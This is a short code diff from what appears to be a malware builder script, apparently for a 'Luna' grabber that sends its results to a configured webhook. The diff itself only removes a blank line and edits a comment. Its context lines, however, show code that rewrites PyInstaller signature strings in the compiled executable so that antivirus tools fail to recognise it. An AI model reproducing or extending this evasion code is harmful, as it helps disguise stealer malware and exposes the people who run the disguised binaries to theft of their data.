@@ -562,7 +562,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 	Luna(__CONFIG__["webhook"])
 				"""
 
-
 				# Remove duplicate imports
 				lines = code.split('\n')
 				unique_lines = []
@@ -807,7 +806,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 		with open(path, "rb") as file:
 			data = file.read()
 		
-		# Remove pyInstaller strings
+		# Remove PyInstaller strings
 		data = data.replace(b"PyInstaller:", b"PyInstallem:")
 		data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
 		data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
